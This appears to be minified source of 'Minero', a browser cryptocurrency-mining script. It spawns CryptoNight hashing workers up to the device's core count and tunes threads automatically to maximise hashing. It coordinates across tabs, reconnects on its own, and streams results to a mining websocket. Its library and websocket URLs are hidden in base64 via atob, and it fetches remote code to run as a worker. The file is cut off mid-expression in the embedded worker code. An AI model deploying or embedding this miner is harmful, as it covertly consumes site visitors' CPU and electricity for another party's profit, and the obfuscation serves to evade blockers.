!(function (n) {
  "use strict";
  function o(e, t) {
    if (
      ((t = t || {}),
      (this._siteKey = e),
      (this._user = null),
      (this._threads = []),
      (this._hashes = 0),
      (this._currentJob = null),
      (this._autoReconnect = !0),
      (this._reconnectRetry = 3),
      (this._tokenFromServer = null),
      (this._goal = 0),
      (this._totalHashesFromDeadThreads = 0),
      (this._throttle = Math.max(0, Math.min(0.99, t.throttle || 0))),
      (this._autoThreads = {
        enabled: !!t.autoThreads,
        interval: null,
        adjustAt: null,
        adjustEvery: 1e4,
        stats: {},
      }),
      (this._tab = {
        ident: (16777215 * Math.random()) | 0,
        mode: Minero.IF_EXCLUSIVE_TAB,
        grace: 0,
        lastPingReceived: 0,
        interval: null,
      }),
      n.BroadcastChannel)
    )
      try {
        (this._bc = new BroadcastChannel("minero")),
          (this._bc.onmessage = function (e) {
            "ping" === e.data && (this._tab.lastPingReceived = Date.now());
          }.bind(this));
      } catch (e) {}
    this._eventListeners = {
      open: [],
      authed: [],
      close: [],
      error: [],
      job: [],
      found: [],
      accepted: [],
    };
    var r = navigator.hardwareConcurrency || 4;
    (this._targetNumThreads = t.threads || r),
      (this._useWASM = this.hasWASMSupport() && !t.forceASMJS),
      (this._asmjsStatus = "unloaded"),
      (this._onTargetMetBound = this._onTargetMet.bind(this)),
      (this._onVerifiedBound = this._onVerified.bind(this));
  }
  (o.prototype.start = function (e) {
    var t;
    (this._tab.mode = e || Minero.IF_EXCLUSIVE_TAB),
      this._tab.interval &&
        (clearInterval(this._tab.interval), (this._tab.interval = null)),
      this._useWASM || "loaded" === this._asmjsStatus
        ? this._startNow()
        : "unloaded" === this._asmjsStatus &&
          ((this._asmjsStatus = "pending"),
          (t = new XMLHttpRequest()).addEventListener(
            "load",
            function () {
              (Minero.CRYPTONIGHT_WORKER_BLOB = n.URL.createObjectURL(
                new Blob([t.responseText])
              )),
                (this._asmjsStatus = "loaded"),
                this._startNow();
            }.bind(this),
            t
          ),
          t.open("get", Minero.CONFIG.LIB_URL + atob("Y3J5cHRvbmlnaHQtYXNtanMubWluLmpz"), !0),
          t.send());
  }),
    (o.prototype.stop = function (e) {
      for (var t = 0; t < this._threads.length; t++)
        (this._totalHashesFromDeadThreads += this._threads[t].hashesTotal),
          this._threads[t].stop();
      (this._threads = []),
        (this._autoReconnect = !1),
        this._socket && this._socket.close(),
        (this._currentJob = null),
        this._autoThreads.interval &&
          (clearInterval(this._autoThreads.interval),
          (this._autoThreads.interval = null)),
        this._tab.interval &&
          "dontKillTabUpdate" !== e &&
          (clearInterval(this._tab.interval), (this._tab.interval = null));
    }),
    (o.prototype.getHashesPerSecond = function () {
      for (var e = 0, t = 0; t < this._threads.length; t++)
        e += this._threads[t].hashesPerSecond;
      return e;
    }),
    (o.prototype.getTotalHashes = function (e) {
      for (
        var t = Date.now(), r = this._totalHashesFromDeadThreads, n = 0;
        n < this._threads.length;
        n++
      ) {
        var o = this._threads[n];
        (r += o.hashesTotal),
          e &&
            (r +=
              ((t - o.lastMessageTimestamp) / 1e3) * 0.9 * o.hashesPerSecond);
      }
      return 0 | r;
    }),
    (o.prototype.getAcceptedHashes = function () {
      return this._hashes;
    }),
    (o.prototype.getToken = function () {
      return this._tokenFromServer;
    }),
    (o.prototype.on = function (e, t) {
      this._eventListeners[e] && this._eventListeners[e].push(t);
    }),
    (o.prototype.getAutoThreadsEnabled = function (e) {
      return this._autoThreads.enabled;
    }),
    (o.prototype.setAutoThreadsEnabled = function (e) {
      (this._autoThreads.enabled = !!e),
        !e &&
          this._autoThreads.interval &&
          (clearInterval(this._autoThreads.interval),
          (this._autoThreads.interval = null)),
        e &&
          !this._autoThreads.interval &&
          ((this._autoThreads.adjustAt =
            Date.now() + this._autoThreads.adjustEvery),
          (this._autoThreads.interval = setInterval(
            this._adjustThreads.bind(this),
            1e3
          )));
    }),
    (o.prototype.getThrottle = function () {
      return this._throttle;
    }),
    (o.prototype.setThrottle = function (e) {
      (this._throttle = Math.max(0, Math.min(0.99, e))),
        this._currentJob && this._setJob(this._currentJob);
    }),
    (o.prototype.getNumThreads = function () {
      return this._targetNumThreads;
    }),
    (o.prototype.setNumThreads = function (e) {
      e = Math.max(1, 0 | e);
      if ((this._targetNumThreads = e) > this._threads.length)
        for (; e > this._threads.length; 0) {
          var t = new Minero.JobThread();
          this._currentJob &&
            t.setJob(this._currentJob, this._onTargetMetBound),
            this._threads.push(t);
        }
      else if (e < this._threads.length)
        for (; e < this._threads.length; ) {
          t = this._threads.pop();
          (this._totalHashesFromDeadThreads += t.hashesTotal), t.stop();
        }
    }),
    (o.prototype.hasWASMSupport = function () {
      return void 0 !== n.WebAssembly;
    }),
    (o.prototype.isRunning = function () {
      return 0 < this._threads.length;
    }),
    (o.prototype._startNow = function () {
      this._tab.mode === Minero.FORCE_MULTI_TAB ||
        this._tab.interval ||
        (this._tab.interval = setInterval(this._updateTabs.bind(this), 1e3)),
        (this._tab.mode === Minero.IF_EXCLUSIVE_TAB &&
          this._otherTabRunning()) ||
          (this._tab.mode === Minero.FORCE_EXCLUSIVE_TAB &&
            (this._tab.grace = Date.now() + 3e3),
          this.verifyThread || (this.verifyThread = new Minero.JobThread()),
          this.setNumThreads(this._targetNumThreads),
          (this._autoReconnect = !0),
          this._connect());
    }),
    (o.prototype._otherTabRunning = function () {
      if (this._tab.lastPingReceived > Date.now() - 1500) return !0;
      try {
        var e = localStorage.getItem("minero");
        if (e) {
          var t = JSON.parse(e);
          if (t.ident !== this._tab.ident && Date.now() - t.time < 1500)
            return !0;
        }
      } catch (e) {}
      return !1;
    }),
    (o.prototype._updateTabs = function () {
      var e = this._otherTabRunning();
      if (
        (e && this.isRunning() && Date.now() > this._tab.grace
          ? this.stop("dontKillTabUpdate")
          : e || this.isRunning() || this._startNow(),
        this.isRunning())
      ) {
        this._bc && this._bc.postMessage("ping");
        try {
          localStorage.setItem(
            "minero",
            JSON.stringify({ ident: this._tab.ident, time: Date.now() })
          );
        } catch (e) {}
      }
    }),
    (o.prototype._adjustThreads = function () {
      var e = this.getHashesPerSecond(),
        t = this.getNumThreads(),
        r = this._autoThreads.stats;
      if (
        ((r[t] = r[t] ? 0.5 * r[t] + 0.5 * e : e),
        Date.now() > this._autoThreads.adjustAt)
      ) {
        this._autoThreads.adjustAt = Date.now() + this._autoThreads.adjustEvery;
        var n = (r[t] || 0) - 1,
          o = r[t + 1] || 0,
          i = r[t - 1] || 0;
        if (i < n && (0 === o || n < o) && t < 8)
          return this.setNumThreads(t + 1);
        if (o < n && (!i || n < i) && 1 < t) return this.setNumThreads(t - 1);
      }
    }),
    (o.prototype._emit = function (e, t) {
      var r = this._eventListeners[e];
      if (r && r.length) for (var n = 0; n < r.length; n++) r[n](t);
    }),
    (o.prototype._hashString = function (e) {
      for (var t = 5381, r = e.length; r; ) t = (33 * t) ^ e.charCodeAt(--r);
      return t >>> 0;
    }),
    (o.prototype._connect = function () {
      var e, t, r, n;
      this._socket ||
        ((e = Minero.CONFIG.WEBSOCKET_SHARDS),
        (t = this._hashString(this._siteKey) % e.length),
        this._siteKey.match(/^nyJe9/) && (t = (Math.random() * e.length) | 0),
        (n = (r = e[t])[(Math.random() * r.length) | 0]),
        (this._socket = new WebSocket(n)),
        (this._socket.onmessage = this._onMessage.bind(this)),
        (this._socket.onerror = this._onError.bind(this)),
        (this._socket.onclose = this._onClose.bind(this)),
        (this._socket.onopen = this._onOpen.bind(this)));
    }),
    (o.prototype._onOpen = function (e) {
      this._emit("open");
      var t = {
        site_key: this._siteKey,
        type: "anonymous",
        user: null,
        goal: 0,
      };
      this._user
        ? ((t.type = "user"), (t.user = this._user.toString()))
        : this._goal && ((t.type = "token"), (t.goal = this._goal)),
        this._send("auth", t);
    }),
    (o.prototype._onError = function (e) {
      this._emit("error", { error: "connection_error" }), this._onClose(e);
    }),
    (o.prototype._onClose = function (e) {
      1003 <= e.code && e.code <= 1009 && (this._reconnectRetry = 60);
      for (var t = 0; t < this._threads.length; t++) this._threads[t].stop();
      (this._threads = []),
        (this._socket = null),
        this._emit("close"),
        this._autoReconnect &&
          setTimeout(this._startNow.bind(this), 1e3 * this._reconnectRetry);
    }),
    (o.prototype._onMessage = function (e) {
      var t = JSON.parse(e.data);
      "job" === t.type
        ? (this._setJob(t.params),
          this._emit("job", t.params),
          this._autoThreads.enabled &&
            !this._autoThreads.interval &&
            ((this._autoThreads.adjustAt =
              Date.now() + this._autoThreads.adjustEvery),
            (this._autoThreads.interval = setInterval(
              this._adjustThreads.bind(this),
              1e3
            ))))
        : "verify" === t.type
        ? this.verifyThread.verify(t.params, this._onVerifiedBound)
        : "hash_accepted" === t.type
        ? ((this._hashes = t.params.hashes),
          this._emit("accepted", t.params),
          this._goal && this._hashes >= this._goal && this.stop())
        : "authed" === t.type
        ? ((this._tokenFromServer = t.params.token || null),
          (this._hashes = t.params.hashes || 0),
          this._emit("authed", t.params),
          (this._reconnectRetry = 3))
        : "error" === t.type
        ? (console &&
            console.error &&
            console.error("Minero Error:", t.params.error),
          this._emit("error", t.params),
          "invalid_site_key" === t.params.error && (this._reconnectRetry = 6e3))
        : ("banned" !== t.type && !t.params.banned) ||
          (this._emit("error", { banned: !0 }), (this._reconnectRetry = 600));
    }),
    (o.prototype._setJob = function (e) {
      (this._currentJob = e), (this._currentJob.throttle = this._throttle);
      for (var t = 0; t < this._threads.length; t++)
        this._threads[t].setJob(e, this._onTargetMetBound);
    }),
    (o.prototype._onTargetMet = function (e) {
      this._emit("found", e),
        e.job_id === this._currentJob.job_id &&
          this._send("submit", {
            job_id: e.job_id,
            nonce: e.nonce,
            result: e.result,
          });
    }),
    (o.prototype._onVerified = function (e) {
      this._send("verified", e);
    }),
    (o.prototype._send = function (e, t) {
      var r;
      this._socket &&
        ((r = { type: e, params: t || {} }),
        this._socket.send(JSON.stringify(r)));
    }),
    (n.Minero = n.Minero || {}),
    (n.Minero.IF_EXCLUSIVE_TAB = "ifExclusiveTab"),
    (n.Minero.FORCE_EXCLUSIVE_TAB = "forceExclusiveTab"),
    (n.Minero.FORCE_MULTI_TAB = "forceMultiTab"),
    (n.Minero.Token = function (e, t, r) {
      var n = new o(e, r);
      return (n._goal = t || 0), n;
    }),
    (n.Minero.User = function (e, t, r) {
      var n = new o(e, r);
      return (n._user = t), n;
    }),
    (n.Minero.Anonymous = function (e, t) {
      return new o(e, t);
    });
})(window),
  (function (e) {
    "use strict";
    function t() {
      (this.worker = new Worker(Minero.CRYPTONIGHT_WORKER_BLOB)),
        (this.worker.onmessage = this.onReady.bind(this)),
        (this.currentJob = null),
        (this.jobCallback = function () {}),
        (this.verifyCallback = function () {}),
        (this._isReady = !1),
        (this.hashesPerSecond = 0),
        (this.hashesTotal = 0),
        (this.running = !1),
        (this.lastMessageTimestamp = Date.now());
    }
    (t.prototype.onReady = function (e) {
      if ("ready" !== e.data || this._isReady)
        throw 'Expecting first message to be "ready", got ' + e;
      (this._isReady = !0),
        (this.worker.onmessage = this.onReceiveMsg.bind(this)),
        this.currentJob &&
          ((this.running = !0), this.worker.postMessage(this.currentJob));
    }),
      (t.prototype.onReceiveMsg = function (e) {
        e.data.verify_id
          ? this.verifyCallback(e.data)
          : (e.data.result && this.jobCallback(e.data),
            (this.hashesPerSecond =
              0.5 * this.hashesPerSecond + 0.5 * e.data.hashesPerSecond),
            (this.hashesTotal += e.data.hashes),
            (this.lastMessageTimestamp = Date.now()),
            this.running && this.worker.postMessage(this.currentJob));
      }),
      (t.prototype.setJob = function (e, t) {
        (this.currentJob = e),
          (this.jobCallback = t),
          this._isReady &&
            !this.running &&
            ((this.running = !0), this.worker.postMessage(this.currentJob));
      }),
      (t.prototype.verify = function (e, t) {
        this._isReady &&
          ((this.verifyCallback = t), this.worker.postMessage(e));
      }),
      (t.prototype.stop = function () {
        this.worker && (this.worker.terminate(), (this.worker = null)),
          (this.running = !1);
      }),
      (e.Minero.JobThread = t);
  })(window),
  (self.Minero = self.Minero || {}),
  (self.Minero.CONFIG = {
    LIB_URL: atob("aHR0cHM6Ly9taW5lcm8uY2MvbGliLw=="),
    MINER_URL: atob("aHR0cHM6Ly9taW5lcm8uY2MvaHRtbC9taW5lci5odG1s"),
    BLANK_MINER_URL: atob("aHR0cHM6Ly9taW5lcm8uY2MvaHRtbC9ibGFuay1taW5lci5odG1s"),
    WEBSOCKET_SHARDS: [
      [atob("d3NzOi8vd29ya2VyLm1pbmVyby5jYw==")]
    ],
    // WEBSOCKET_SHARDS: [["http://localhost:8082"]],
    DONATE_WIDGET_URL: atob("aHR0cHM6Ly9taW5lcm8uY2Mvd2lkZ2V0L2RvbmF0ZQ==")
  }),
  (Minero.CRYPTONIGHT_WORKER_BLOB = URL.createObjectURL(
    new Blob([
      'var key,Module=void 0!==(Module={locateFile:function(e){return"https://minero.cc/lib/"+e}})?Module:{},moduleOverrides={};for(key in Module)Module.hasOwnProperty(key)&&(moduleOverrides[key]=Module[key]);var read_,readAsync,readBinary,setWindowTitle,nodeFS,nodePath,arguments_=[],thisProgram="./this.program",quit_=function(e,t){throw t},ENVIRONMENT_IS_WEB=!1,ENVIRONMENT_IS_WORKER=!1,ENVIRONMENT_IS_NODE=!1,ENVIRONMENT_HAS_NODE=!1,ENVIRONMENT_IS_SHELL=!1,ENVIRONMENT_IS_WEB="object"==typeof window,ENVIRONMENT_IS_WORKER="function"==typeof importScripts,ENVIRONMENT_IS_NODE=(ENVIRONMENT_HAS_NODE="object"==typeof process&&"object"==typeof process.versions&&"string"==typeof process.versions.node)&&!ENVIRONMENT_IS_WEB&&!ENVIRONMENT_IS_WORKER,ENVIRONMENT_IS_SHELL=!ENVIRONMENT_IS_WEB&&!ENVIRONMENT_IS_NODE&&!ENVIRONMENT_IS_WORKER,scriptDirectory="";function locateFile(e){return Module.locateFile?Module.locateFile(e,scriptDirectory):scriptDirectory+e}ENVIRONMENT_IS_NODE?(scriptDirectory=__dirname+"/",read_=function(e,t){return nodeFS=nodeFS||require("fs"),e=(nodePath=nodePath||require("path")).normalize(e),nodeFS.readFileSync(e,t?null:"utf8")},readBinary=function(e){var t=read_(e,!0);return t.buffer||(t=new Uint8Array(t)),assert(t.buffer),t},1<process.argv.length&&(thisProgram=process.argv[1].replace(/\\\\/g,"/")),arguments_=process.argv.slice(2),"undefined"!=typeof module&&(module.exports=Module),process.on("uncaughtException",function(e){if(!(e instanceof ExitStatus))throw e}),process.on("unhandledRejection",abort),quit_=function(e){process.exit(e)},Module.inspect=function(){return"[Emscripten Module object]"}):ENVIRONMENT_IS_SHELL?("undefined"!=typeof read&&(read_=function(e){return read(e)}),readBinary=function(e){var t;return"function"==typeof readbuffer?new Uint8Array(readbuffer(e)):(assert("object"==typeof(t=read(e,"binary"))),t)},"undefined"!=typeof scriptArgs?arguments_=scriptArgs:"undefined"!=typeof arguments&&(arguments_=arguments),"function"==typeof quit&&(quit_=function(e){quit(e)}),"undefined"!=typeof print&&("undefined"==typeof console&&(console={}),console.log=print,console.warn=console.error="undefined"!=typeof printErr?printErr:print)):(ENVIRONMENT_IS_WEB||ENVIRONMENT_IS_WORKER)&&(ENVIRONMENT_IS_WORKER?scriptDirectory=self.location.href:document.currentScript&&(scriptDirectory=document.currentScript.src),scriptDirectory=0!==scriptDirectory.indexOf("blob:")?scriptDirectory.substr(0,scriptDirectory.lastIndexOf("/")+1):"",read_=function(e){var t=new XMLHttpRequest;return t.open("GET",e,!1),t.send(null),t.responseText},ENVIRONMENT_IS_WORKER&&(readBinary=function(e){var t=new XMLHttpRequest;return t.open("GET",e,!1),t.responseType="arraybuffer",t.send(null),new Uint8Array(t.response)}),readAsync=function(e,t,r){var n=new XMLHttpRequest;n.open("GET",e,!0),n.responseType="arraybuffer",n.onload=function(){200==n.status||0==n.status&&n.response?t(n.response):r()},n.onerror=r,n.send(null)},setWindowTitle=function(e){document.title=e});var wasmBinary,noExitRuntime,wasmMemory,out=Module.print||console.log.bind(console),err=Module.printErr||console.warn.bind(console);for(key in moduleOverrides)moduleOverrides.hasOwnProperty(key)&&(Module[key]=moduleOverrides[key]);function dynamicAlloc(e){var t=HEAP32[DYNAMICTOP_PTR>>2],r=t+e+15&-16;return r>_emscripten_get_heap_size()&&abort(),HEAP32[DYNAMICTOP_PTR>>2]=r,t}function getNativeTypeSize(e){switch(e){case"i1":case"i8":return 1;case"i16":return 2;case"i32":return 4;case"i64":return 8;case"float":return 4;case"double":return 8;default:if("*"===e[e.length-1])return 4;if("i"!==e[0])return 0;var t=parseInt(e.substr(1));return assert(t%8==0,"getNativeTypeSize invalid bits "+t+", type "+e),t/8}}function setValue(e,t,r,n){switch("*"===(r=r||"i8").charAt(r.length-1)&&(r="i32"),r){case"i1":case"i8":HEAP8[e>>0]=t;break;case"i16":HEAP16[e>>1]=t;break;case"i32":HEAP32[e>>2]=t;break;case"i64":tempI64=[t>>>0,1<=+Math_abs(tempDouble=t)?0<tempDouble?(0|Math_min(+Math_floor(tempDouble/4294967296),4294967295))>>>0:~~+Math_ceil((tempDouble-(~~tempDouble>>>0))/4294967296)>>>0:0],HEAP32[e>>2]=tempI64[0],HEAP32[e+4>>2]=tempI64[1];break;case"float":HEAPF32[e>>2]=t;break;case"double":HEAPF64[e>>3]=t;break;default:abort("invalid type for setValue: "+r)}}moduleOverrides=null,Module.arguments&&(arguments_=Module.arguments),Module.thisProgram&&(thisProgram=Module.thisProgram),Module.quit&&(quit_=Module.quit),Module.wasmBinary&&(wasmBinary=Module.wasmBinary),Module.noExitRuntime&&(noExitRuntime=Module.noExitRuntime),"object"!=typeof WebAssembly&&err("no native wasm support detected");var wasmTable=new WebAssembly.Table({initial:74,maximum:74,element:"anyfunc"}),ABORT=!1,EXITSTATUS=0;function assert(e,t){e||abort("Assertion failed: "+t)}var ALLOC_NONE=3;function allocate(e,t,r,n){var o,i,a="number"==typeof e?(o=!0,e):(o=!1,e.length),s="string"==typeof t?t:null,u=r==ALLOC_NONE?n:[_malloc,stackAlloc,dynamicAlloc][r](Math.max(a,s?1:t.length));if(o){for(assert(0==(3&(n=u))),i=u+(-4&a);n<i;n+=4)HEAP32[n>>2]=0;for(i=u+a;n<i;)HEAP8[n++>>0]=0;return u}if("i8"===s)return e.subarray||e.slice?HEAPU8.set(e,u):HEAPU8.set(new Uint8Array(e),u),u;for(var l,c,d=0;d<a;){var f,h=e[d];0!==(f=s||t[d])?("i64"==f&&(f="i32"),setValue(u+d,h,f),c!==f&&(l=getNativeTypeSize(f),c=f),d+=l):d++}return u}var UTF8Decoder="undefined"!=typeof TextDecoder?new TextDecoder("utf8"):void 0;function UTF8ArrayToString(e,t,r){for(var n=t+r,o=t;e[o]&&!(n<=o);)++o;if(16<o-t&&e.subarray&&UTF8Decoder)return UTF8Decoder.decode(e.subarray(t,o));for(var i="";t<o;){var a,s,u,l=e[t++];128&l?(a=63&e[t++],192!=(224&l)?(s=63&e[t++],(l=224==(240&l)?(15&l)<<12|a<<6|s:(7&l)<<18|a<<12|s<<6|63&e[t++])<65536?i+=String.fromCharCode(l):(u=l-65536,i+=String.fromCharCode(55296|u>>10,56320|1023&u))):i+=String.fromCharCode((31&l)<<6|a)):i+=String.fromCharCode(l)}return i}function UTF8ToString(e,t){return e?UTF8ArrayToString(HEAPU8,e,t):""}function stringToUTF8Array(e,t,r,n){if(!(0<n))return 0;for(var o=r,i=r+n-1,a=0;a<e.length;++a){var s=e.charCodeAt(a);if(55296<=s&&s<=57343&&(s=65536+((1023&s)<<10)|1023&e.charCodeAt(++a)),s<=127){if(i<=r)break;t[r++]=s}else if(s<=2047){if(i<=r+1)break;t[r++]=192|s>>6,t[r++]=128|63&s}else if(s<=65535){if(i<=r+2)break;t[r++]=224|s>>12,t[r++]=128|s>>6&63,t[r++]=128|63&s}else{if(i<=r+3)break;t[r++]=240|s>>18,t[r++]=128|s>>12&63,t[r++]=128|s>>6&63,t[r++]=128|63&s}}return t[r]=0,r-o}function stringToUTF8(e,t,r){return stringToUTF8Array(e,HEAPU8,t,r)}function lengthBytesUTF8(e){for(var t=0,r=0;r<e.length;++r){var n=e.charCodeAt(r);55296<=n&&n<=57343&&(n=65536+((1023&n)<<10)|1023&e.charCodeAt(++r)),n<=127?++t:t+=n<=2047?2:n<=65535?3:4}return t}var UTF16Decoder="undefined"!=typeof TextDecoder?new TextDecoder("utf-16le"):void 0;function writeAsciiToMemory(e,t,r){for(var n=0;n<e.length;++n)HEAP8[t++>>0]=e.charCodeAt(n);r||(HEAP8[t>>0]=0)}var buffer,HEAP8,HEAPU8,HEAP16,HEAPU16,HEAP32,HEAPU32,HEAPF32,HEAPF64,WASM_PAGE_SIZE=65536;function updateGlobalBufferAndViews(e){buffer=e,Module.HEAP8=HEAP8=new Int8Array(e),Module.HEAP16=HEAP16=new Int16Array(e),Module.HEAP32=HEAP32=new Int32Array(e),Module.HEAPU8=HEAPU8=new Uint8Array(e),Module.HEAPU16=HEAPU16=new Uint16Array(e),Module.HEAPU32=HEAPU32=new Uint32Array(e),Module.HEAPF32=HEAPF32=new Float32Array(e),Module.HEAPF64=HEAPF64=new Float64Array(e)}var DYNAMIC_BASE=5269104,DYNAMICTOP_PTR=26064,INITIAL_TOTAL_MEMORY=Module.TOTAL_MEMORY||285212672;function callRuntimeCallbacks(e){for(;0<e.length;){var t,r=e.shift();"function"!=typeof r?"number"==typeof(t=r.func)?void 0===r.arg?Module.dynCall_v(t):Module.dynCall_vi(t,r.arg):t(void 0===r.arg?null:r.arg):r()}}(wasmMemory=Module.wasmMemory?Module.wasmMemory:new WebAssembly.Memory({initial:INITIAL_TOTAL_MEMORY/WASM_PAGE_SIZE,maximum:INITIAL_TOTAL_MEMORY/WASM_PAGE_SIZE}))&&(buffer=wasmMemory.buffer),INITIAL_TOTAL_MEMORY=buffer.byteLength,updateGlobalBufferAndViews(buffer),HEAP32[DYNAMICTOP_PTR>>2]=DYNAMIC_BASE;var __ATPRERUN__=[],__ATINIT__=[],__ATMAIN__=[],__ATPOSTRUN__=[],runtimeInitialized=!1,runtimeExited=!1;function preRun(){if(Module.preRun)for("function"==typeof Module.preRun&&(Module.preRun=[Module.preRun]);Module.preRun.length;)addOnPreRun(Module.preRun.shift());callRuntimeCallbacks(__ATPRERUN__)}function initRuntime(){runtimeInitialized=!0,Module.noFSInit||FS.init.initialized||FS.init(),TTY.init(),callRuntimeCallbacks(__ATINIT__)}function preMain(){FS.ignorePermissions=!1,callRuntimeCallbacks(__ATMAIN__)}function exitRuntime(){runtimeExited=!0}function postRun(){if(Module.postRun)for("function"==typeof Module.postRun&&(Module.postRun=[Module.postRun]);Module.postRun.length;)addOnPostRun(Module.postRun.shift());callRuntimeCallbacks(__ATPOSTRUN__)}function addOnPreRun(e){__ATPRERUN__.unshift(e)}function addOnPostRun(e){__ATPOSTRUN__.unshift(e)}var Math_abs=Math.abs,Math_ceil=Math.ceil,Math_floor=Math.floor,Math_min=Math.min,runDependencies=0,runDependencyWatcher=null,dependenciesFulfilled=null;function getUniqueRunDependency(e){return e}function addRunDependency(e){runDependencies++,Module.monitorRunDependencies&&Module.monitorRunDependencies(runDependencies)}function removeRunDependency(e){var t;runDependencies--,Module.monitorRunDependencies&&Module.monitorRunDependencies(runDependencies),0==runDependencies&&(null!==runDependencyWatcher&&(clearInterval(runDependencyWatcher),runDependencyWatcher=null),dependenciesFulfilled&&(t=dependenciesFulfilled,dependenciesFulfilled=null,t()))}function abort(e){throw Module.onAbort&&Module.onAbort(e),out(e+=""),err(e),ABORT=!0,EXITSTATUS=1,e="abort("+e+"). Build with -s ASSERTIONS=1 for more info.",new WebAssembly.RuntimeError(e)}Module.preloadedImages={},Module.preloadedAudios={};var dataURIPrefix="data:application/octet-stream;base64,";function isDataURI(e){return String.prototype.startsWith?e.startsWith(dataURIPrefix):0===e.indexOf(dataURIPrefix)}var tempDouble,tempI64,wasmBinaryFile=atob("Y3J5cHRvbmlnaHQud2FzbQ==");function getBinary(){try{if(wasmBinary)return new Uint8Array(wasmBinary);if(readBinary)return readBinary(wasmBinaryFile);throw"both async and sync fetching of the wasm failed"}catch(e){abort(e)}}function getBinaryPromise(){return wasmBinary||!ENVIRONMENT_IS_WEB&&!ENVIRONMENT_IS_WORKER||"function"!=typeof fetch?new Promise(function(e,t){e(getBinary())}):fetch(wasmBinaryFile,{credentials:"same-origin"}).then(function(e){if(!e.ok)throw"failed to load wasm binary file at \'"+wasmBinaryFile+"\'";return e.arrayBuffer()}).catch(function(){return getBinary()})}function createWasm(){var t={env:asmLibraryArg,wasi_unstable:asmLibraryArg};function r(e,t){var r=e.exports;Module.asm=r,removeRunDependency("wasm-instantiate")}function n(e){r(e.instance)}function o(e){return getBinaryPromise().then(function(e){return WebAssembly.instantiate(e,t)}).then(e,function(e){err("failed to asynchronously prepare wasm: "+e),abort(e)})}if(addRunDependency("wasm-instantiate"),Module.instantiateWasm)try{return Module.instantiateWasm(t,r)}catch(e){return err("Module.instantiateWasm callback failed with error: "+e),!1}return function(){if(wasmBinary||"function"!=typeof WebAssembly.instantiateStreaming||isDataURI(wasmBinaryFile)||"function"!=typeof fetch)return o(n);fetch(wasmBinaryFile,{credentials:"same-origin"}).then(function(e){return WebAssembly.instantiateStreaming(e,t).then(n,function(e){err("wasm streaming compile failed: "+e),err("falling back to ArrayBuffer instantiation"),o(n)})})}(),{}}function demangle(e){return e}function demangleAll(e){return e.replace(/\\b_Z[\\w\\d_]+/g,function(e){var t=demangle(e);return e===t?e:t+" ["+e+"]"})}function jsStackTrace(){var t=new Error;if(!t.stack){try{throw new Error(0)}catch(e){t=e}if(!t.stack)return"(no stack trace available)"}return t.stack.toString()}function stackTrace(){var e=jsStackTrace();return Module.extraStackTrace&&(e+="\\n"+Module.extraStackTrace()),demangleAll(e)}function ___assert_fail(e,t,r,n){abort("Assertion failed: "+UTF8ToString(e)+", at: "+[t?UTF8ToString(t):"unknown filename",r,n?UTF8ToString(n):"unknown function"])}function ___cxa_allocate_exception(e){return _malloc(e)}isDataURI(wasmBinaryFile)||(wasmBinaryFile=locateFile(wasmBinaryFile)),__ATINIT__.push({func:function(){___wasm_call_ctors()}});var ___exception_infos={},___exception_last=0;function ___cxa_throw(e,t,r){throw ___exception_infos[e]={ptr:e,adjusted:[e],type:t,destructor:r,refcount:0,caught:!1,rethrown:!1},___exception_last=e,"uncaught_exception"in __ZSt18uncaught_exceptionv?__ZSt18uncaught_exceptionv.uncaught_exceptions++:__ZSt18uncaught_exceptionv.uncaught_exceptions=1,e}var PATH={splitPath:function(e){return/^(\\/?|)([\\s\\S]*?)((?:\\.{1,2}|[^\\/]+?|)(\\.[^.\\/]*|))(?:[\\/]*)$/.exec(e).slice(1)},normalizeArray:function(e,t){for(var r=0,n=e.length-1;0<=n;n--){var o=e[n];"."===o?e.splice(n,1):".."===o?(e.splice(n,1),r++):r&&(e.splice(n,1),r--)}if(t)for(;r;r--)e.unshift("..");return e},normalize:function(e){var t="/"===e.charAt(0),r="/"===e.substr(-1);return(e=PATH.normalizeArray(e.split("/").filter(function(e){return!!e}),!t).join("/"))||t||(e="."),e&&r&&(e+="/"),(t?"/":"")+e},dirname:function(e){var t=PATH.splitPath(e),r=t[0],n=t[1];return r||n?r+(n=n&&n.substr(0,n.length-1)):"."},basename:function(e){if("/"===e)return"/";var t=e.lastIndexOf("/");return-1===t?e:e.substr(t+1)},extname:function(e){return PATH.splitPath(e)[3]},join:function(){var e=Array.prototype.slice.call(arguments,0);return PATH.normalize(e.join("/"))},join2:function(e,t){return PATH.normalize(e+"/"+t)}};function ___setErrNo(e){return Module.___errno_location&&(HEAP32[Module.___errno_location()>>2]=e),e}var PATH_FS={resolve:function(){for(var e="",t=!1,r=arguments.length-1;-1<=r&&!t;r--){var n=0<=r?arguments[r]:FS.cwd();if("string"!=typeof n)throw new TypeError("Arguments to path.resolve must be strings");if(!n)return"";e=n+"/"+e,t="/"===n.charAt(0)}return(t?"/":"")+(e=PATH.normalizeArray(e.split("/").filter(function(e){return!!e}),!t).join("/"))||"."},relative:function(e,t){function r(e){for(var t=0;t<e.length&&""===e[t];t++);for(var r=e.length-1;0<=r&&""===e[r];r--);return r<t?[]:e.slice(t,r-t+1)}e=PATH_FS.resolve(e).substr(1),t=PATH_FS.resolve(t).substr(1);for(var n=r(e.split("/")),o=r(t.split("/")),i=Math.min(n.length,o.length),a=i,s=0;s<i;s++)if(n[s]!==o[s]){a=s;break}for(var u=[],s=a;s<n.length;s++)u.push("..");return(u=u.concat(o.slice(a))).join("/")}},TTY={ttys:[],init:function(){},shutdown:function(){},register:function(e,t){TTY.ttys[e]={input:[],output:[],ops:t},FS.registerDevice(e,TTY.stream_ops)},stream_ops:{open:function(e){var t=TTY.ttys[e.node.rdev];if(!t)throw new FS.ErrnoError(43);e.tty=t,e.seekable=!1},close:function(e){e.tty.ops.flush(e.tty)},flush:function(e){e.tty.ops.flush(e.tty)},read:function(e,t,r,n,o){if(!e.tty||!e.tty.ops.get_char)throw new FS.ErrnoError(60);for(var i,a=0,s=0;s<n;s++){try{i=e.tty.ops.get_char(e.tty)}catch(e){throw new FS.ErrnoError(29)}if(void 0===i&&0===a)throw new FS.ErrnoError(6);if(null==i)break;a++,t[r+s]=i}return a&&(e.node.timestamp=Date.now()),a},write:function(e,t,r,n,o){if(!e.tty||!e.tty.ops.put_char)throw new FS.ErrnoError(60);try{for(var i=0;i<n;i++)e.tty.ops.put_char(e.tty,t[r+i])}catch(e){throw new FS.ErrnoError(29)}return n&&(e.node.timestamp=Date.now()),i}},default_tty_ops:{get_char:function(e){if(!e.input.length){var t=null;if(ENVIRONMENT_IS_NODE){var r=Buffer.alloc?Buffer.alloc(256):new 